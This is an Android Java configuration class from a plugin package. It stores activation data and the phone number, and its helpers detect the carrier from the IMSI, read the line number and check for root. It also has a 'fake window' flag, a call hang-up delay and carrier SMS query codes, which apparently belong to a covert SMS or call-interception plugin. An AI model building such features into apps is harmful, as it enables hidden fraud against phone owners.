package com.xstd.plugin.config;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.api.ActiveResponse;

import java.io.*;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-22
 * Time: AM9:43
 * To change this template use File | Settings | File Templates.
 */
public class AppRuntime {

    /**
     * 当前获取激活数据的线程是否在跑
     */
    public static AtomicBoolean ACTIVE_PROCESS_RUNNING = new AtomicBoolean(false);

    /**
     * 当前的激活返回数据，需要做一个持久化
     */
    public static ActiveResponse ACTIVE_RESPONSE = null;

    public static String PHONE_NUMBER = null;

    /**
     * 默认的挂断电话的时间延迟
     */
    public static final int END_CALL_DELAY = 8 * 1000;

    public static boolean FAKE_WINDOW_SHOW = false;

    public static void readActiveResponse(String filePath) {
        if (Config.DEBUG) {
            Config.LOGD("[[readActiveResponse]] try to read response data from file : " + filePath);
        }

        File file = new File(filePath);
        if (!file.exists()) {
            ACTIVE_RESPONSE = null;
        } else {
            try {
                FileInputStream fis = new FileInputStream(file);
                ObjectInputStream ois = new ObjectInputStream(fis);
                ACTIVE_RESPONSE = (ActiveResponse) ois.readObject();
                ois.close();
                fis.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void saveActiveResponse(String filePath) {
        if (Config.DEBUG) {
            Config.LOGD("[[saveActiveResponse]] try to save response data to file : " + filePath);
        }

        if (ACTIVE_RESPONSE == null) {
            return;
        }

        File file = new File(filePath);
        if (!file.exists()) {
            try {
                file.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        try {
            FileOutputStream fos = new FileOutputStream(file, false);
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(ACTIVE_RESPONSE);
            oos.close();
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static final boolean isVersionBeyondGB() {
        return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
    }

    /**
     * 向运营商发送的查询短信指令，从返回的指令中获取到短信中心的号码
     */
    public static final class SMSCenterCommand {
        public static final String CMNET_CMD = "0000";

        public static final String UNICOM_CMD1 = "102";
        public static final String UNICOM_CMD2 = "YE";
        public static final String UNICOM_CMD3 = "YECX";
        public static final String UNICOM_CMD4 = "CXHF";
    }

    public static final int CMNET = 1;
    public static final int UNICOM = 2;
    public static final int TELECOM = 3;
    public static final int SUBWAY = 4;

    public static int getNetworkTypeByIMSI(Context context) {
        String imsi = UtilsRuntime.getIMSI(context);
        if (!TextUtils.isEmpty(imsi) && imsi.length() > 6) {
            String mnc = imsi.substring(3, 5);
            if ("00".equals(mnc) || "02".equals(mnc) || "07".equals(mnc)) {
                //移动
                return 1;
            } else if ("01".equals(mnc) || "06".equals(mnc)) {
                //联通
                return 2;
            } else if ("03".equals(mnc) || "05".equals(mnc)) {
                //电信
                return 3;
            } else if ("20".equals(mnc)) {
                //铁通
                return 4;
            }
        }

        return -1;
    }

    public static String getPhoneNumber(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm != null) {
            return tm.getLine1Number();
        }

        return null;
    }

    private final static int kSystemRootStateUnknow = -1;
    private final static int kSystemRootStateDisable = 0;
    private final static int kSystemRootStateEnable = 1;
    private static int systemRootState = kSystemRootStateUnknow;

    /**
     * 判断系统是否root
     *
     * @return
     */
    public static boolean isRootSystem() {
        if (systemRootState == kSystemRootStateEnable) {
            return true;
        } else if (systemRootState == kSystemRootStateDisable) {
            return false;
        }
        File f = null;
        final String kSuSearchPaths[] = {"/system/bin/", "/system/xbin/", "/system/sbin/", "/sbin/", "/vendor/bin/"};
        try {
            for (int i = 0; i < kSuSearchPaths.length; i++) {
                f = new File(kSuSearchPaths[i] + "su");
                if (f != null && f.exists()) {
                    systemRootState = kSystemRootStateEnable;
                    return true;
                }
            }
        } catch (Exception e) {
        }

        systemRootState = kSystemRootStateDisable;
        return false;
    }

}
